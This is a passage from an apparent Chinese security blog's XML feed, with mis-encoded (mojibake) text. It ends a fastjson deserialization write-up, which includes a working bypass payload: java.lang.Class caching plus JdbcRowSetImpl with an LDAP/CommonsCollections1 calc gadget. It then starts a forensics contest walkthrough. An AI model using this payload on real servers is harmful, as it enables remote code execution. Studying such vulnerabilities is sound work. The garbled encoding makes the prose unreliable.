&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åªæœ‰å½“cacheä¸ºtrueæ˜¯æ‰ä¼šå¯¹mappingsè¿›è¡Œputï¼Œè€Œè¿™ä¸ªLoadClassåœ¨è¯¥ç±»çš„å†…éƒ¨ä¹Ÿè¢«è¿›è¡Œäº†ä¸€æ¬¡è°ƒç”¨ï¼Œä¸”ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºtrueå¦‚ä¸‹<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/59.png" class="" title="alt text"></p><p>æˆ‘ä»¬å†ç»§ç»­æŸ¥çœ‹è°ƒç”¨äº†TypeUtils.LoadClassçš„ç±»<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/60.png" class="" title="alt text"><br>å¾€ä¸Šæ‰¾æˆ‘ä»¬èƒ½åœ¨MiscCodec.javaä¸‹æ‰¾åˆ°è¿™ä¸ªç±»çš„è°ƒç”¨å½“Clazz==Class.classæ˜¯ä¼šè°ƒç”¨è¿™ä¸ªã€‚è€ŒstrValå°±æ˜¯classNameã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªstrValæ˜¯æ€ä¹ˆèµ‹å€¼çš„<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">        parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.RBRACE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String strVal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br></pre></td></tr></table></figure><br>å…¶ä¼šå…ˆåˆ¤æ–­ååºåˆ—åŒ–çš„ç±»çš„å±æ€§æ˜¯å¦ä¸ºvalï¼Œç„¶åå†å°†varçš„å€¼èµ‹å€¼ç»™objValï¼Œè€ŒstrValçš„å€¼å°±æ˜¯(String)objVal<br>é‚£ä¹ˆé—®é¢˜æ¥äº†æˆ‘ä»¬è¦æ€ä¹ˆè¿›åˆ°è¿™ä¸ªç±»é‡Œå‘¢?<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/61.png" class="" title="alt text"><br>æˆ‘ä»¬æŸ¥çœ‹è¿™ä¸ªç±»å®ç°çš„æ¥å£å¯ä»¥å‘ç°MiscCodecå…¶å®æ˜¯ä¸€ä¸ªååºåˆ—åŒ–å™¨ã€‚<br>æˆ‘ä»¬åœ¨ä¹‹å‰æœ‰çš„å®¡è®¡ä¸­å°±æœ‰åˆ†æè¿‡ã€‚ååºåˆ—åŒ–å™¨çš„è·å–<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/56.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/57.png" class="" title="alt text"><br>åœ¨åˆšè¿›å…¥è·å–ååºåˆ—å™¨çš„æ–¹æ³•å†…æ—¶éƒ½ä¼šå…ˆåœ¨derializerså†…æ‰¾ååºåˆ—åŒ–å™¨ã€‚è€Œæˆ‘ä»¬çœ‹ä¸Šé¢çš„ä»£ç å¯ä»¥å‘ç°å½“ç±»ä¸ºClass.classæ—¶è¿”å›çš„ååºåˆ—åŒ–å™¨å°±æ˜¯MiscCodec</p><p>è€Œæˆ‘ä»¬ä¼ å…¥çš„<code>@type</code>çš„å€¼ä¸ºjava.lang.Class,è€Œè¿™ä¸ªç±»é»˜è®¤å°±å†™å†ç¼“å­˜é‡Œäº†ï¼Œæ‰€ä»¥ä¸ä¼šè¢«wafæ‹¦æˆª</p><p>ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬ä¼ å…¥çš„jsoncodeçš„@Typeçš„å€¼ä¸ºjava.lang.Classæ—¶å°±ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªååºåˆ—åŒ–å™¨ã€‚é‚£ä¹ˆæˆ‘ä»¬å†å°†valå†™æˆæˆ‘ä»¬çš„æ¶æ„ç±»åï¼Œæ¶æ„ç±»ä¸å°±è¢«å†™å…¥äº†å—</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/62.png" class="" title="alt text"><p>é‚£ä¹ˆæ—¢ç„¶æˆåŠŸå†™å…¥äº†æˆ‘ä»¬çš„æ¶æ„ç±»ï¼Œé‚£åªè¦å†è®©å…¶ååºåˆ—åŒ–åŸç†çš„æ¶æ„ç±»å³å¯</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_bypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;2\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1/HHfKyiQrGd/CommonsCollections1/Exec/eyJjbWQiOiJjYWxjIn0=\&quot;, \&quot;autoCommit\&quot;:false&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸Š</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a><br><a href="https://www.bilibili.com/video/BV1bD4y117Qh?spm_id_from=333.788.videopod.sections&amp;vd_source=ab689e9c3d9afbb6b90af5af510d53e3">https://www.bilibili.com/video/BV1bD4y117Qh?spm_id_from=333.788.videopod.sections&amp;vd_source=ab689e9c3d9afbb6b90af5af510d53e3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾äºš21</title>
      <link href="/2024/10/15/%E7%BE%8E%E4%BA%9A21/"/>
      <url>/2024/10/15/%E7%BE%8E%E4%BA%9A21/</url>
      
        <content type="html"><![CDATA[<h1 id="æ—¢ç„¶æŠ¥åäº†ç¾äºšå½“ç„¶å¾—å­¦ä¸€ä¸‹å–è¯äº†ï¼Œå…ˆå†™ä¸€ä¸‹21å¹´çš„ç¾äºšå§"><a href="#æ—¢ç„¶æŠ¥åäº†ç¾äºšå½“ç„¶å¾—å­¦ä¸€ä¸‹å–è¯äº†ï¼Œå…ˆå†™ä¸€ä¸‹21å¹´çš„ç¾äºšå§" class="headerlink" title="æ—¢ç„¶æŠ¥åäº†ç¾äºšå½“ç„¶å¾—å­¦ä¸€ä¸‹å–è¯äº†ï¼Œå…ˆå†™ä¸€ä¸‹21å¹´çš„ç¾äºšå§"></a>æ—¢ç„¶æŠ¥åäº†ç¾äºšå½“ç„¶å¾—å­¦ä¸€ä¸‹å–è¯äº†ï¼Œå…ˆå†™ä¸€ä¸‹21å¹´çš„ç¾äºšå§</h1><h1 id="æ£€æå¤„ç†"><a href="#æ£€æå¤„ç†" class="headerlink" title="æ£€æå¤„ç†"></a>æ£€æå¤„ç†</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/1.png" class="" title="alt text"><p>é¦–å…ˆä¸‹è½½çš„æ£€ææœ‰ä¸€ä¸ªç”µè„‘çš„é•œåƒæ–‡ä»¶ï¼Œå’Œå‹ç¼©åŒ…<br>è§£å‹è¿™ä¸ªå‹ç¼©åŒ…ã€‚<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/2.png" class="" title="alt text"><br>é‡Œé¢æ˜¯ä¸€ä¸ªåŠ å¯†å®¹å™¨ï¼Œå°†åŠ å¯†å®¹å™¨ç”¨VeraCryptæ‰“å¼€ï¼Œè¿›å…¥å®¹å™¨æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªæ£€æåˆ—è¡¨<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/3.png" class="" title="alt text"><br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/4.png" class="" title="alt text"><br>æ ¹æ®åˆ—è¡¨ä¸€ä¸ªä¸ªæ•´ç†æ£€æ</p><h1 id="1-å·¥åœ°ä¸»ç®¡ç”µè¯çš„å¾®ä¿¡è´¦å·æ˜¯ä»€ä¹ˆ"><a href="#1-å·¥åœ°ä¸»ç®¡ç”µè¯çš„å¾®ä¿¡è´¦å·æ˜¯ä»€ä¹ˆ" class="headerlink" title="1.å·¥åœ°ä¸»ç®¡ç”µè¯çš„å¾®ä¿¡è´¦å·æ˜¯ä»€ä¹ˆ?"></a>1.å·¥åœ°ä¸»ç®¡ç”µè¯çš„å¾®ä¿¡è´¦å·æ˜¯ä»€ä¹ˆ?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/5.png" class="" title="alt text"><p>ä¸»åŠæ–¹åœ¨æ‰‹æœºé™„ä»¶å†…ï¼Œå¸¦äº†ä¸€ä¸ªå–è¯è½¯ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥æ‰“å¼€è¿™ä¸ªè½¯ä»¶ã€‚<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/6.png" class="" title="alt text"></p><p>åœ¨èŠå¤©æŠ¥å‘Šé‡Œå¯ä»¥å‘ç°ï¼Œå…¶ä½¿ç”¨çš„èŠå¤©è½¯ä»¶æ˜¯whatappï¼Œæ²¡æœ‰å¾®ä¿¡ï¼Œæ‰€ä»¥è¿™é¢˜é€‰dï¼Œå·¥åœ°ä¸»ç®¡æ²¡æœ‰å¾®ä¿¡</p><h1 id="2-å·¥åœ°ä¸»ç®¡çš„éš”ç©ºæŠ•é€è£…ç½®ç½®ç¼–å·æ˜¯ä»€ä¹ˆ"><a href="#2-å·¥åœ°ä¸»ç®¡çš„éš”ç©ºæŠ•é€è£…ç½®ç½®ç¼–å·æ˜¯ä»€ä¹ˆ" class="headerlink" title="2.å·¥åœ°ä¸»ç®¡çš„éš”ç©ºæŠ•é€è£…ç½®ç½®ç¼–å·æ˜¯ä»€ä¹ˆ?"></a>2.å·¥åœ°ä¸»ç®¡çš„éš”ç©ºæŠ•é€è£…ç½®ç½®ç¼–å·æ˜¯ä»€ä¹ˆ?</h1><p>é¦–å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯éš”ç©ºæŠ•é€<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/7.png" class="" title="alt text"><br>æˆ‘ä»¬æœç´¢AirDrop<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/8.png" class="" title="alt text"></p><h1 id="3-å·¥åœ°ä¸»ç®¡ç”µè¯çš„å“ªä¸€ä¸ªåº”ç”¨ç¨‹åºæœ‰å…³äºç»çº¬åº¦24-490474-118-110220çš„çºªå½•"><a href="#3-å·¥åœ°ä¸»ç®¡ç”µè¯çš„å“ªä¸€ä¸ªåº”ç”¨ç¨‹åºæœ‰å…³äºç»çº¬åº¦24-490474-118-110220çš„çºªå½•" class="headerlink" title="3.å·¥åœ°ä¸»ç®¡ç”µè¯çš„å“ªä¸€ä¸ªåº”ç”¨ç¨‹åºæœ‰å…³äºç»çº¬åº¦24.490474, 118.110220çš„çºªå½•?"></a>3.å·¥åœ°ä¸»ç®¡ç”µè¯çš„å“ªä¸€ä¸ªåº”ç”¨ç¨‹åºæœ‰å…³äºç»çº¬åº¦24.490474, 118.110220çš„çºªå½•?</h1><p>åŒæ ·æœç´¢<br><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/9.png" class="" title="alt text"></p><h1 id="4-å·¥åœ°ä¸»ç®¡çš„æ‰‹æç”µè¯ä¸­ä¸‹åˆ—å“ªäº›æ•°æ®æ­£ç¡®"><a href="#4-å·¥åœ°ä¸»ç®¡çš„æ‰‹æç”µè¯ä¸­ä¸‹åˆ—å“ªäº›æ•°æ®æ­£ç¡®" class="headerlink" title="4.å·¥åœ°ä¸»ç®¡çš„æ‰‹æç”µè¯ä¸­ä¸‹åˆ—å“ªäº›æ•°æ®æ­£ç¡®?"></a>4.å·¥åœ°ä¸»ç®¡çš„æ‰‹æç”µè¯ä¸­ä¸‹åˆ—å“ªäº›æ•°æ®æ­£ç¡®?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/10.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/12.png" class="" title="alt text"><p>é€‰Aï¼ŒC</p><h1 id="5-å·¥åœ°ä¸»ç®¡çš„ç”µè¯æœ€å¸¸ä½¿ç”¨çš„æµè§ˆå™¨æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™å›ç­”"><a href="#5-å·¥åœ°ä¸»ç®¡çš„ç”µè¯æœ€å¸¸ä½¿ç”¨çš„æµè§ˆå™¨æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™å›ç­”" class="headerlink" title="5.å·¥åœ°ä¸»ç®¡çš„ç”µè¯æœ€å¸¸ä½¿ç”¨çš„æµè§ˆå™¨æ˜¯ä»€ä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™å›ç­”)"></a>5.å·¥åœ°ä¸»ç®¡çš„ç”µè¯æœ€å¸¸ä½¿ç”¨çš„æµè§ˆå™¨æ˜¯ä»€ä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/13.png" class="" title="alt text"><p>SAFARI<br>ç½‘é¡µæµè§ˆè®°å½•é‡Œæœ‰æµè§ˆå™¨åç§°</p><h1 id="6-å·¥åœ°ä¸»ç®¡çš„ç”µè¯è¿æ¥è¿‡å“ªä¸€ä¸ªWiFi"><a href="#6-å·¥åœ°ä¸»ç®¡çš„ç”µè¯è¿æ¥è¿‡å“ªä¸€ä¸ªWiFi" class="headerlink" title="6.å·¥åœ°ä¸»ç®¡çš„ç”µè¯è¿æ¥è¿‡å“ªä¸€ä¸ªWiFi?"></a>6.å·¥åœ°ä¸»ç®¡çš„ç”µè¯è¿æ¥è¿‡å“ªä¸€ä¸ªWiFi?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/wifi.png" class="" title="alt text"><p>å†æ— çº¿ç½‘ç»œäº†å¯ä»¥æ‰¾åˆ°ä¹‹å‰è¿æ¥çš„WiFiå</p><h1 id="7-å·¥åœ°ä¸»ç®¡ä¸Alex-Chançš„Whatsapp-å¯¹è¯ä¸­ï¼Œæ›¾æåŠä»¥ä¸‹å“ªä¸ªTeamViewerçš„ç”¨æˆ·å·ç "><a href="#7-å·¥åœ°ä¸»ç®¡ä¸Alex-Chançš„Whatsapp-å¯¹è¯ä¸­ï¼Œæ›¾æåŠä»¥ä¸‹å“ªä¸ªTeamViewerçš„ç”¨æˆ·å·ç " class="headerlink" title="7.å·¥åœ°ä¸»ç®¡ä¸Alex Chançš„Whatsapp å¯¹è¯ä¸­ï¼Œæ›¾æåŠä»¥ä¸‹å“ªä¸ªTeamViewerçš„ç”¨æˆ·å·ç ?"></a>7.å·¥åœ°ä¸»ç®¡ä¸Alex Chançš„Whatsapp å¯¹è¯ä¸­ï¼Œæ›¾æåŠä»¥ä¸‹å“ªä¸ªTeamViewerçš„ç”¨æˆ·å·ç ?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/14.png" class="" title="alt text"><p>èŠå¤©è®°å½•çš„è¿™ä¸‰å¼ å›¾ç‰‡å«æœ‰ç”¨æˆ·ID</p><h1 id="8-å·¥åœ°ä¸»ç®¡çš„WhatsAppä¸­æœ‰å¤šå°‘ä¸ªé»‘åå•çš„è®°å½•-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#8-å·¥åœ°ä¸»ç®¡çš„WhatsAppä¸­æœ‰å¤šå°‘ä¸ªé»‘åå•çš„è®°å½•-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="8.å·¥åœ°ä¸»ç®¡çš„WhatsAppä¸­æœ‰å¤šå°‘ä¸ªé»‘åå•çš„è®°å½•? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>8.å·¥åœ°ä¸»ç®¡çš„WhatsAppä¸­æœ‰å¤šå°‘ä¸ªé»‘åå•çš„è®°å½•? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/bu.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/15.png" class="" title="alt text"><p>ä»æ•°æ®åº“é‡Œæ‰¾ä¼šå‘ç°æ‰¾ä¸åˆ°blacklist</p><h1 id="9-ä»¥ä¸‹å“ªä¸ªè“ç‰™è£…ç½®çš„-Uuid-æ›¾è¿æ¥è¿‡å·¥åœ°ä¸»ç®¡çš„æ‰‹æœº"><a href="#9-ä»¥ä¸‹å“ªä¸ªè“ç‰™è£…ç½®çš„-Uuid-æ›¾è¿æ¥è¿‡å·¥åœ°ä¸»ç®¡çš„æ‰‹æœº" class="headerlink" title="9.ä»¥ä¸‹å“ªä¸ªè“ç‰™è£…ç½®çš„ Uuid æ›¾è¿æ¥è¿‡å·¥åœ°ä¸»ç®¡çš„æ‰‹æœº?"></a>9.ä»¥ä¸‹å“ªä¸ªè“ç‰™è£…ç½®çš„ Uuid æ›¾è¿æ¥è¿‡å·¥åœ°ä¸»ç®¡çš„æ‰‹æœº?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/bule.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/uu.png" class="" title="alt text"><h1 id="10-å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„Eç›˜çš„Bitlockerä¿®å¤å¯†é’¥æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ"><a href="#10-å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„Eç›˜çš„Bitlockerä¿®å¤å¯†é’¥æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ" class="headerlink" title="10.å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„Eç›˜çš„Bitlockerä¿®å¤å¯†é’¥æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ)"></a>10.å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„Eç›˜çš„Bitlockerä¿®å¤å¯†é’¥æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/16.png" class="" title="alt text"><p>æœç´¢Bitlockerå¯ä»¥æ‰¾åˆ°</p><h1 id="11-å·¥åœ°ä¸»ç®¡è®¡ç®—æœºå…§çš„FTPç¨‹åºFileZillaçš„ç”¨æˆ·åç§°æ˜¯ç”šä¹ˆ"><a href="#11-å·¥åœ°ä¸»ç®¡è®¡ç®—æœºå…§çš„FTPç¨‹åºFileZillaçš„ç”¨æˆ·åç§°æ˜¯ç”šä¹ˆ" class="headerlink" title="11.å·¥åœ°ä¸»ç®¡è®¡ç®—æœºå…§çš„FTPç¨‹åºFileZillaçš„ç”¨æˆ·åç§°æ˜¯ç”šä¹ˆ?"></a>11.å·¥åœ°ä¸»ç®¡è®¡ç®—æœºå…§çš„FTPç¨‹åºFileZillaçš„ç”¨æˆ·åç§°æ˜¯ç”šä¹ˆ?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/y.png" class="" title="alt text"><h1 id="12-å·¥åœ°ä¸»ç®¡çš„Team-Viewer-ID-æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#12-å·¥åœ°ä¸»ç®¡çš„Team-Viewer-ID-æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="12.å·¥åœ°ä¸»ç®¡çš„Team Viewer ID æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>12.å·¥åœ°ä¸»ç®¡çš„Team Viewer ID æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/18.png" class="" title="alt text"><h1 id="13-å·¥åœ°ä¸»ç®¡çš„Team-Viewerä¸å“ªä¸€ä¸ªIDè¿æ¥-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”"><a href="#13-å·¥åœ°ä¸»ç®¡çš„Team-Viewerä¸å“ªä¸€ä¸ªIDè¿æ¥-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”" class="headerlink" title="13.å·¥åœ°ä¸»ç®¡çš„Team Viewerä¸å“ªä¸€ä¸ªIDè¿æ¥? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)"></a>13.å·¥åœ°ä¸»ç®¡çš„Team Viewerä¸å“ªä¸€ä¸ªIDè¿æ¥? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/18.png" class="" title="alt text"><h1 id="14-å¤šé€‰é¢˜-å·¥åœ°ä¸»ç®¡æ›¾ç”¨è®¡ç®—æœºæµè§ˆå™¨ä½œæœå¯»ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªå…³é”®è¯ä»–æ›¾ç»æœå¯»"><a href="#14-å¤šé€‰é¢˜-å·¥åœ°ä¸»ç®¡æ›¾ç”¨è®¡ç®—æœºæµè§ˆå™¨ä½œæœå¯»ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªå…³é”®è¯ä»–æ›¾ç»æœå¯»" class="headerlink" title="14.(å¤šé€‰é¢˜) å·¥åœ°ä¸»ç®¡æ›¾ç”¨è®¡ç®—æœºæµè§ˆå™¨ä½œæœå¯»ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªå…³é”®è¯ä»–æ›¾ç»æœå¯»?"></a>14.(å¤šé€‰é¢˜) å·¥åœ°ä¸»ç®¡æ›¾ç”¨è®¡ç®—æœºæµè§ˆå™¨ä½œæœå¯»ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªå…³é”®è¯ä»–æ›¾ç»æœå¯»?</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/19.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/20.png" class="" title="alt text"><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/21.png" class="" title="alt text"><p>é€‰æ‹©facebookå’Œweb whatsappï¼Œlinkgæ²¡æœ‰å†å…³é”®è¯å‡ºç°ï¼Œè€Œæ˜¯å†ç½‘é¡µurlå‡ºç°</p><h1 id="å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„Windowsç³»ç»Ÿçš„äº§å“æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ"><a href="#å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„Windowsç³»ç»Ÿçš„äº§å“æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ" class="headerlink" title="å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„Windowsç³»ç»Ÿçš„äº§å“æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ)"></a>å·¥åœ°ä¸»ç®¡è®¡ç®—æœºçš„Windowsç³»ç»Ÿçš„äº§å“æ ‡è¯†ç¬¦æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€œ)</h1><img src="/2024/10/15/%E7%BE%8E%E4%BA%9A21/22.png" class="" title="alt text"><h1 id="16-å·¥åœ°ä¸»ç®¡æ›¾ç”¨è®¡ç®—æœºä½¿ç”¨WhatsAppï¼Œä»–æ›¾å’Œä»¥ä¸‹å“ªä¸ªç”µè¯å·ç æ²Ÿé€š"><a href="#16-å·¥åœ°ä¸»ç®¡æ›¾ç”¨è®¡ç®—æœºä½¿ç”¨WhatsAppï¼Œä»–æ›¾å’Œä»¥ä¸‹å“ªä¸ªç”µè¯å·ç æ²Ÿé€š" class="headerlink" 